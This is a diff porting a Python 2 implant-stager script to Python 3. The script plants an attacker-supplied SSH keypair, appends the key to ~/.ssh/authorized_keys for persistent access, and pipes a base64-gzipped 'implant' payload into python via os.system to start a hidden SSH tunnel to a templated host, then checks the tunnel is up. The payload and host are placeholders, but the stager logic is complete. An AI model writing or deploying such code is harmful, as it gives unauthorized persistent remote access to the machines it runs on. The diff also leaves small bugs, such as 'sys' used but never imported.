@@ -1,4 +1,4 @@
-#/usr/bin/env python
+#!/usr/bin/env python3
 # Copyright (c) 2023, Oracle and/or its affiliates.
 
 import os
@@ -7,7 +7,7 @@ import stat
 import base64
 import subprocess
 import time
-import StringIO
+import io  # replace StringIO
 import gzip
 from string import ascii_lowercase
 import socket
@@ -15,43 +15,44 @@ import socket
 PRIVKEY = "PRIVATE_KEY_PLACEHOLDER"
 PUBKEY = "PUBLIC_KEY_PLACEHOLDER"
 PORT = "PORT_PLACEHOLDER"
-FQDN ="FQDN_PLACEHOLDER"
+FQDN = "FQDN_PLACEHOLDER"
 
 RW = stat.S_IRUSR | stat.S_IWUSR
 
+
 def w(p, b):
-    # b: content to base64 decoded
-    # p: path to write to
-    with open(p, "w") as f:
-        f.write(base64.b64decode(b))
-    os.chmod(p, stat.S_IRUSR | stat.S_IWUSR)
+    with open(p, "wb") as f:  # "wb" since the result of b64decode is bytes
+        f.write(base64.b64decode(b.encode()))  # encode the string to bytes before decoding
+    os.chmod(p, RW)
+
 
 def templify(template, replacements):
     out = template
-    for k, v in replacements.iteritems():
+    for k, v in replacements.items():
         out = out.replace(k, v)
     return out
 
+
 def gzbase(stuff):
-    out = StringIO.StringIO()
+    out = io.BytesIO()  # replace StringIO.StringIO
     with gzip.GzipFile(fileobj=out, mode="wb") as f:
-        f.write(stuff)
-    return base64.b64encode(out.getvalue())
+        f.write(stuff.encode())
+    return base64.b64encode(out.getvalue()).decode()  # return as string
+
 
 def ungzbase(unbased):
-    gzipped = StringIO.StringIO()
-    gzipped.write(base64.b64decode(unbased))
+    gzipped = io.BytesIO()  # replace StringIO.StringIO
+    gzipped.write(base64.b64decode(unbased.encode()))  # encode the string to bytes before decoding
     gzipped.seek(0)
     with gzip.GzipFile(fileobj=gzipped) as f:
-        return f.read()
+        return f.read().decode()  # return as string
 
-# if .ssh doesn't exist, make it
+
 DOTSSH = os.path.expanduser("~/.ssh")
 if not os.path.exists(DOTSSH):
     os.mkdir(DOTSSH)
     os.chmod(DOTSSH, stat.S_IRWXU)
 
-# discover what our keyname is
 KEYPATH_TEMPLATE = os.path.expanduser("~/.ssh/id_rsa")
 keypath = None
 pubkeypath = None
@@ -60,58 +61,39 @@ for c in ascii_lowercase[1:]:
     pubkeypath = keypath + ".pub"
     if not os.path.exists(keypath):
         break
-print "[+] keypath: %s" % keypath
+print("[+] keypath:", keypath)
 
 w(keypath, PRIVKEY)
-print "[+] wrote private key:", keypath
+print("[+] wrote private key:", keypath)
 w(pubkeypath, PUBKEY)
-print "[+] wrote public key:", pubkeypath
+print("[+] wrote public key:", pubkeypath)
 
-# we can ssh to ourselves, which is done through the backflip
 with open(os.path.expanduser("~/.ssh/authorized_keys"), "a") as f:
-    f.write(base64.b64decode(PUBKEY))
-    print "[+] wrote to ~/.ssh/authorized_keys"
+    f.write(base64.b64decode(PUBKEY.encode()).decode())  # decode bytes to string
+    print("[+] wrote to ~/.ssh/authorized_keys")
 
-
-# fix the KEYFILE path in implant
 payload = ungzbase('IMPLANT_PLACEHOLDER')
-encoded = gzbase(templify(payload, {'KEYFILE_PLACEHOLDER' : keypath}))
+encoded = gzbase(templify(payload, {'KEYFILE_PLACEHOLDER': keypath}))
 
-# FIRE THE TORPEDO!
-os.system("echo %s | base64 -d | gzip -d | python " % encoded)
+os.system("echo %s | base64 -d | gzip -d | python3 " % encoded)
 
-print "[+] started daemonized tunnel"
-
-print "[*] waiting one minute for tunnel to come up..."
+print("[+] started daemonized tunnel")
+print("[*] waiting one minute for tunnel to come up...")
 time.sleep(5)
 
 psx = "ps x | grep ssh | grep '%s' | grep -v grep | wc -l" % FQDN
-proc = subprocess.Popen(psx, shell=True, stdout=subprocess.PIPE)
+proc = subprocess.Popen(psx, shell=True, stdout=subprocess.PIPE, text=True)  # use text=True
 (out, err) = proc.communicate()
 num = int(out.strip())
-if num == 2: # there sh -c and ssh itself
-    print "[+] tunnel running"
+if num == 2:
+    print("[+] tunnel running")
 else:
-    print "[-] seems like %d copies running" % num
-    print "[-] Something is wrong.  You should investigate/clean-up"
+    print(f"[-] seems like {num} copies running")
+    print("[-] Something is wrong.  You should investigate/clean-up")
     sys.exit()
 
-# Check if sshd is running
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-result = sock.connect_ex(('127.0.0.1',22))
+result = sock.connect_ex(('127.0.0.1', 22))
 if result != 0:
-   print "[-] sshd needs to be enabled on this system"
+    print("[-] sshd needs to be enabled on this system")
 sock.close()
-
-#
-# Editor modelines  -  https://www.wireshark.org/tools/modelines.html
-#
-# Local variables:
-# c-basic-offset: 4
-# indent-tabs-mode: nil
-# End:
-#
-# vi: set shiftwidth=4 expandtab:
-# :indentSize=4:noTabs=true:
-#
-
